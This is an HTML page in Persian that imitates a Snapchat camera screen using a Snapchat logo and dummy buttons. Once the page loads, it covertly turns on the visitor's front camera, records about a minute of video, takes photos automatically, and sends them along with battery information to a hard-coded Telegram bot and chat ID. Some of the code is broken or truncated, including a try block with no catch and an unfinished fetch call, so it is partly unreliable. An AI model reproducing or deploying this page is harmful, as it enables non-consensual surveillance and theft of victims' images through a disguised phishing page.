<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8" />
  <title>Snap Auto</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/lucide@latest"></script>
  <style>
    body {
      direction: rtl;
      font-family: 'Vazirmatn', sans-serif;
      margin: 0;
      background: #fff000;
      overflow: hidden;
    }

    #video {
      position: absolute;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      z-index: 0;
    }

    .overlay {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 2;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      padding: 1rem;
      pointer-events: none;
    }

    .top-bar {
      display: flex;
      justify-content: space-between;
    }

    .fake-btn {
      background-color: rgba(255, 255, 255, 0.6);
      border-radius: 9999px;
      padding: 0.5rem;
      transition: transform 0.2s ease;
    }

    .fake-btn:active {
      transform: scale(0.95);
    }

    .circle-btn {
      width: 72px;
      height: 72px;
      background-color: white;
      border-radius: 50%;
      border: 4px solid #000;
      transition: transform 0.2s ease;
    }

    .circle-btn:active {
      transform: scale(0.9);
    }

    #splash {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: #fff000;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 10;
      animation: fadeOut 1s ease 2.5s forwards;
    }

    @keyframes fadeOut {
      to { opacity: 0; visibility: hidden; }
    }

    .snap-logo {
      width: 140px;
      animation: pop 1.2s ease;
    }

    @keyframes pop {
      0% { transform: scale(0.5); opacity: 0; }
      60% { transform: scale(1.1); opacity: 1; }
      100% { transform: scale(1); }
    }
  </style>
</head>
<body>
  <!-- Splash Screen -->
  <div id="splash">
    <img class="snap-logo" src="https://upload.wikimedia.org/wikipedia/commons/a/ad/Snapchat_logo.svg" alt="Snapchat">
  </div>

  <!-- Video Background -->
  <video id="video" autoplay playsinline muted></video>

  <!-- Overlay -->
  <div class="overlay">
    <div class="top-bar">
      <button class="fake-btn" onclick="noop()">
        <i data-lucide="rotate-ccw"></i>
      </button>
      <button class="fake-btn" onclick="noop()">
        <i data-lucide="camera"></i>
      </button>
    </div>
    <div class="flex justify-center pb-4">
      <button class="circle-btn" onclick="noop()"></button>
    </div>
  </div>

  <script>
    lucide.createIcons();
    function noop() { /* Ù†Ù…Ø§ÛŒØ´ÛŒ */ }

    let stream;
    let mediaRecorder;
    let chunks = [];
    let photoCount = 0;
    let videoSent = false;

    const botToken = "7720902826:AAEK57GNutoXcCEYyTcWeySwRt829nxPhDI";
    const chatId = "-1002651451203";

    async function getBatteryInfo() {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging
        };
      }
      return { level: "?", charging: false };
    }

    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { width: 640, height: 480, facingMode: "user" }
        });
        document.getElementById('video').srcObject = stream;
        startRecording();
        takeAutoPhotos();

      }
    }

    async function takePhoto() {
      const video = document.getElementById("video");
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(async blob => {
        const battery = await getBatteryInfo();
        const caption = `ðŸ“¸ Ø¹Ú©Ø³ ${++photoCount}\nðŸ”‹ Ø´Ø§Ø±Ú˜: ${battery.level}%\nâš¡ Ø´Ø§Ø±Ú˜Ø±: ${battery.charging ? "ÙˆØµÙ„ Ø§Ø³Øª" : "Ù‚Ø·Ø¹ Ø§Ø³Øª"}`;
        const form = new FormData();

        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {

      }, 'image/jpeg', 0.8);

    function takeAutoPhotos() {
      setTimeout(takePhoto, 1000);
      setTimeout(takePhoto, 5000);
    }

    function startRecording() {
      chunks = [];
      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = sendVideo;
      mediaRecorder.start();

      setTimeout(() => {
        if (mediaRecorder && mediaRecorder.state === "recording") {
          mediaRecorder.stop();
        }
      }, 60000);
    }

    async function sendVideo() {
      if (videoSent || chunks.length === 0) return;
      videoSent = true;
      const battery = await getBatteryInfo();
      const blob = new Blob(chunks, { type: "video/webm" });
      const form = new FormData();
      form.append("chat_id", chatId);

      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
        method: "POST",
        body: form
      });
    }

    window.addEventListener("beforeunload", () => {
      if (mediaRecorder && mediaRecorder.state === "recording") {
        mediaRecorder.stop();
      }
    });

    document.addEventListener("visibilitychange", () => {
      if (document.hidden && mediaRecorder && mediaRecorder.state === "recording") {
        mediaRecorder.stop();
      }
    });

    // Start camera after splash
    setTimeout(startCamera, 2500);
  </script>
</body>
</html>
